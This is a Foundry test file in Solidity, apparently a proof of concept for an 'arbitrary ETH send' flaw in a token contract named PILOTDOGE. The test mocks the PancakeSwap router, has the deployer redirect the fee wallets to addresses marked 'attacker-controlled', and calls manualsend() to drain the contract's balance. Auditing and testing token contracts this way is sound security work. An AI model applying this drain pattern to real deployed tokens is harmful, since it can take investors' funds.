// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/PILOTDOGE.sol";

contract DummyContract {
    receive() external payable {}
}

contract MockFactory {
    function createPair(address, address) external returns (address) {
        return address(new DummyContract());
    }
}

contract MockRouter {
    address public factory;
    address public weth;

    constructor(address _factory, address _weth) {
        factory = _factory;
        weth = _weth;
    }

    function WETH() external view returns (address) {
        return weth;
    }
}

contract PilotDogeArbitrarySendTest is Test {
    PILOTDOGE public token;
    address public deployer = makeAddr("deployer");
    address public newDev = makeAddr("newDev");
    address public newMarketing = makeAddr("newMarketing");
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    
    // Helper function for readable log formatting
    function toETH(uint256 weiAmount) internal pure returns (string memory) {
        return string(abi.encodePacked(vm.toString(weiAmount / 1e18), ".", vm.toString(weiAmount % 1e18 / 1e14), " ether"));
    }

    function setUp() public {
        // Create mock contracts
        address mockWETH = address(new DummyContract());
        MockFactory mockFactory = new MockFactory();
        
        // Deploy mock router and get its bytecode
        MockRouter mockRouterTemplate = new MockRouter(address(mockFactory), mockWETH);
        bytes memory routerCode = address(mockRouterTemplate).code;
        
        // Mock the PancakeSwap router
        vm.etch(PANCAKE_ROUTER, routerCode);
        
        // Calculate storage slots for MockRouter
        bytes32 factorySlot = bytes32(0);      // slot 0: address public factory
        bytes32 wethSlot = bytes32(uint256(1)); // slot 1: address public weth
        
        // Set storage values without nested casts
        bytes32 factoryValue = bytes32(uint256(uint160(address(mockFactory))));
        bytes32 wethValue = bytes32(uint256(uint160(mockWETH)));
        vm.store(PANCAKE_ROUTER, factorySlot, factoryValue);
        vm.store(PANCAKE_ROUTER, wethSlot, wethValue);
        
        // Deploy token contract
        vm.prank(deployer);
        token = new PILOTDOGE();
        
        // Fund contract with ETH
        vm.deal(address(token), 10 ether);
    }

    function test_arbitrary_eth_transfer() public {
        // Change fee recipient addresses to attacker-controlled ones
        vm.startPrank(deployer);
        token.setNewDevAddress(payable(newDev));
        token.setNewMarketingAddress(payable(newMarketing));
        vm.stopPrank();
        
        console.log("--- BEFORE-Trigger State ---");
        // Record ETH balances before trigger
        uint256 contractBalanceBefore = address(token).balance;
        uint256 devBalanceBefore = newDev.balance;
        uint256 marketingBalanceBefore = newMarketing.balance;
        
        console.log("Contract ETH:", toETH(contractBalanceBefore));
        console.log("Dev Address ETH:", toETH(devBalanceBefore));
        console.log("Marketing Address ETH:", toETH(marketingBalanceBefore));
        
        console.log("--- Trigger Operation: token.manualsend() ---");
        // Trigger ETH transfers
        vm.prank(deployer);
        token.manualsend();
        
        console.log("--- AFTER-Trigger State ---");
        // Record ETH balances after trigger
        uint256 contractBalanceAfter = address(token).balance;
        uint256 devBalanceAfter = newDev.balance;
        uint256 marketingBalanceAfter = newMarketing.balance;
        
        console.log("Contract ETH:", toETH(contractBalanceAfter));
        console.log("Dev Address ETH:", toETH(devBalanceAfter));
        console.log("Marketing Address ETH:", toETH(marketingBalanceAfter));
        
        console.log("--- Difference Calculations ---");
        // Calculate balance changes
        uint256 contractChange = contractBalanceBefore - contractBalanceAfter;
        uint256 devChange = devBalanceAfter - devBalanceBefore;
        uint256 marketingChange = marketingBalanceAfter - marketingBalanceBefore;
        uint256 totalTransfer = devChange + marketingChange;
        
        console.log("Contract Reduction:", toETH(contractChange));
        console.log("Dev Received:", toETH(devChange));
        console.log("Marketing Received:", toETH(marketingChange));
        console.log("Total Transferred:", toETH(totalTransfer));
        
        // Vulnerability verification conditions
        bool contractDrained = (contractBalanceAfter == 0);
        bool transfersMatch = (contractChange == totalTransfer);
        bool transfersCorrect = ((contractChange / 2 == devChange) && 
                                (contractChange / 2 == marketingChange));
        
        // Final vulnerability determination
        bool vulnerable = contractDrained && transfersMatch && transfersCorrect;
        
        if (vulnerable) {
            console.log("Vulnerability Exists: ETH was drained to unauthorized addresses");
        } else {
            console.log("Vulnerability not Exist: ETH balances did not change as expected");
        }
    }
}